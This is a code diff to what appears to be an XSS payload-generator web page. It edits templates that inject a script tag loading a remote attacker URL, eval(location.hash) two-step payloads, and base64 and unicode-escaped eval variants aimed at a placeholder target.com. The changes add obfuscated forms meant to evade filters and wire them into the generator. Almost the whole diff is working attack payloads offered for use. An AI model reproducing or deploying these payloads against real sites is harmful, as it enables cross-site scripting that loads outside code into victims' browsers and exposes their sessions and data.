@@ -11,7 +11,7 @@
     <!-- payloads template -->
 
     <textarea id="data0"
-        hidden="true">var a=document.createElement('script');a.src='arr0w1_url';document.body.appendChild(a);</textarea>
+        hidden="true">with(document)body.appendChild(createElement('script')).src='arr0w1_url'</textarea>
 
     <textarea id="data1" hidden="true">
 1⃣️ eval(JavaScript_content)
@@ -39,9 +39,13 @@ https://target.com/page?title="><script>eval(location.hash.split(%27%23%27)[1])<
 
 
 4⃣️ XSS in two steps
-eval(location.hash.split('#')[1])
+eval(location.hash.slice(1))
+// or
+setTimeout`\u0065\u0076\u0061\u006c\u0028\u006c\u006f\u0063\u0061\u0074\u0069\u006f\u006e\u002e\u0068\u0061\u0073\u0068\u002e\u0073\u006c\u0069\u0063\u0065\u0028\u0031\u0029\u0029`
 
 🔴 Will be triggered when someone visits the URL:
+https://target.com/page_with_the_payload#arr0w1_on_event_js
+// or
 https://target.com/page_with_the_payload#'eval\x28atob\x28\x27arr0w1_base64\x27\x29\x29'instanceof{[Symbol['hasInstance']]:eval}</textarea>
 
     <textarea id="data2" hidden="true">
@@ -218,13 +222,13 @@ https://target.com/page_with_the_payload#'eval\x28atob\x28\x27arr0w1_base64\x27\
 
         var your_url_path = document.getElementById("your_url_path").value;
 
-        var js_code_append_a_script_tag_with_url_path = document.getElementById("data0").value.replace("arr0w1_url", your_url_path)
+        var js_code_append_a_script_tag_with_url_path = document.getElementById("data0").value.replace("arr0w1_url", your_url_path);
 
         var js_code_append_a_script_tag_btoa_ed = func_wise_btoa(js_code_append_a_script_tag_with_url_path);
 
         document.getElementById("payload0").value = js_code_append_a_script_tag_with_url_path;
 
-        document.getElementById("payload1").value = data1.replace(/arr0w1_base64/g, js_code_append_a_script_tag_btoa_ed).replace(/arr0w1_url/g, your_url_path);
+        document.getElementById("payload1").value = data1.replace(/arr0w1_on_event_js/g,js_code_append_a_script_tag_with_url_path).replace(/arr0w1_base64/g, js_code_append_a_script_tag_btoa_ed).replace(/arr0w1_url/g, your_url_path);
 
         // 全部匹配 /g
         document.getElementById("payload2").value = data2.replace(/arr0w1_on_event_js/g,js_code_append_a_script_tag_with_url_path).replace(/arr0w1_base64/g, js_code_append_a_script_tag_btoa_ed);
